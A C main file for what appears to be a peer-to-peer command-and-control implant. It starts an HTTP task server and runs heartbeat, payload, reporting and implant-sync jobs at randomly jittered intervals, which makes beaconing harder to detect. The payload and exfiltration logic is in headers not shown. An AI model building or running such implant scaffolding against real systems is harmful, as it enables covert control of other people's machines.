#include "http-client.h"
#include "config.h"
#include "heartbeat.h"
#include "peers.h"
#include "task_queue.h"
#include "task-log.h"
#include "result_queue.h"
#include "payload.h"
#include "server.h"
#include "sync-implants.h"
#include "report.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>


// Generic job strucutres so we dont have to pass around a bunch of different
// parameters to the job functions in massive if else shit
typedef void (*job_fn)(void *ctx);
typedef struct {
  job_fn  fn;
  void   *ctx;
  int     base;
  int     jitter;
  time_t  next_run;
} Job; // oh hell nah j*b


typedef struct {
    TaskQueue *tq;
    TaskLog *tl;
} ServerCtx;

void *server_thread(void *arg) {
    ServerCtx *ctx = arg;
    start_http_server(ctx->tq, ctx->tl);
    return NULL;
}


int main() {

  heartbeat_job(NULL);

  if (init_global_peers() != 0) {
    fprintf(stderr, "❌ - Failed to get initial peer list\n");
    return 1;
  }

  TaskQueue tq;
  TaskLog tl;
  ResultQueue rq;

  tq_init(&tq); rq_init(&rq); tl_init(&tl);


  ServerCtx sr_ctx = { .tq = &tq, .tl = &tl };

  pthread_t server_tid;
  pthread_create(&server_tid,
               NULL,
               server_thread,
               &sr_ctx);
  pthread_detach(server_tid);

  // contexts, aka the params
  PayloadContext pl_ctx = { .tq = &tq, .rq = &rq };
  GossipContext gp_ctx = { .tq = &tq, .rq = &rq, .tl = &tl };
  ReportContext rp_ctx = { .rq = &rq };

  Job jobs[] = {
    { .fn = heartbeat_job, .ctx = NULL, .base = HEARTBEAT_INTERVAL, .jitter = 5 },
    { .fn = payload_job, .ctx = &pl_ctx, .base = PAYLOAD_INTERVAL, .jitter = 5 },
    { .fn = reporting_job, .ctx = &rp_ctx, .base = REPORT_INTERVAL, .jitter = 5 },
    { .fn = sync_job, .ctx = &gp_ctx, .base = SYNC_INTERVAL, .jitter = 10 }
  };
  size_t n_jobs = sizeof(jobs) / sizeof(*jobs);


  srand(time(NULL));
  time_t now = time(NULL);

  // giving every job their first run time
  for(size_t i = 0; i < n_jobs; i++) {
    jobs[i].next_run = now + jobs[i].base + (rand() % (2 * jobs[i].jitter + 1) - jobs[i].jitter);
  }

  while(1) {
    time_t now = time(NULL);
    time_t nearest = now + 3600;

    // run the loop for every job and pass them the context then move the next_run to next run time
    for (size_t i = 0; i < n_jobs; i++) {
      if(now >= jobs[i].next_run) {
        jobs[i].fn(jobs[i].ctx);
        jobs[i].next_run += jobs[i].base + (rand() % (2 * jobs[i].jitter + 1) - jobs[i].jitter);
      }

      if(jobs[i].next_run < nearest) {
        nearest = jobs[i].next_run;
      }
    }

    time_t delta = nearest - now;
    if(delta < 1) {
      delta = 1; // aint no point of sleeping for less than a second
    }
    sleep(delta);
  };

  return 0;
}
